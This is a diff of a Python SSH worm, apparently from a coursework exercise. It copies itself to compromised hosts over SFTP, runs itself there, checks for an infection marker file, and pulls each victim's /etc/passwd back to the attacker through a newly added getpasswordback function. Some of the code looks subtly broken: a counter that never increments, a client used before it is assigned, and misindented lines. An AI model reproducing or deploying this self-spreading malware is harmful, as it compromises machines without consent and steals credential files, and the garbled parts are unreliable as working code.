@@ -81,24 +81,12 @@ def spreadAndExecute(sshClient,systemIP1):
 	print("****************inside the spreadAndExecute***********")
 	# MIG: Changed this one to the SFTP client
 	if len(sys.argv) < 2:
-		interface = netifaces.interfaces()
-		systemIP12 = getMyIP(interface)
 		sftpClient.put("/tmp/replicator_worm.py","/tmp/replicator_worm.py")
-		print("start to copy")
-		#copy attack system
-		sftpClient = sshClient.open_sftp()
-		remotepath = '/etc/passwd'
-		localpath = '/home/passwd_'+systemIP12
-		sftpClient.get(remotepath, localpath)
+
 
 	else:
 		sftpClient.put("replicator_worm.py","/tmp/replicator_worm.py")
-		print("start to copy1")
-		#copy attack system
-		sftpClient = sshClient.open_sftp()
-		remotepath = '/etc/passwd'
-		localpath = '/home/passwd_'+systemIP1[0]
-		sftpClient.get(remotepath, localpath)
+
 
 	sshClient.exec_command("chmod a+x /tmp/replicator_worm.py")
 	sshClient.exec_command("python /tmp/replicator_worm.py")
@@ -317,7 +305,7 @@ for host in attackList:
 	sshInfo =  attackSystem(host)
 	
 	print sshInfo
-	
+	count =0
 	
 	# Did the attack succeed?
 	if sshInfo:
@@ -360,7 +348,9 @@ for host in attackList:
 		# To do that, you need an instance of the sftp client. 
 		# not SSH.
 		sftpClient = sshInfo[0].open_sftp()
-		
+
+
+
 		try:
 			# MIG: Check if the /tmp/infected.txt file
 			# already exists at the remote system.
@@ -369,8 +359,22 @@ for host in attackList:
 			sftpClient.stat("/tmp/infected.txt")
 			print "The remote system ", sshInfo,  " already contains the infected.txt file"
 		except:
-			print("inside if isInfectedSytem() statement ")
-			spreadAndExecute(sshInfo[0],HostIP)
-			print("done infecting")
-			exit()
+			if count == 0:
+				count + 1
+				print("inside if isInfectedSytem() statement ")
+				spreadAndExecute(sshInfo[0],HostIP)
+				print("done infecting")
+			else:
+				getpasswordback(sshInfo[0],HostIP[host])
+
 			
+def getpasswordback(sshClient,HostIp):
+
+	print("***************getting Password***********")
+		print("start to copy")
+		#copy attack system
+		sftpClient = sshClient.open_sftp()
+		remotepath = '/etc/passwd'
+		localpath = '/home/passwd_'+HostIp
+		sftpClient.get(remotepath, localpath)
+
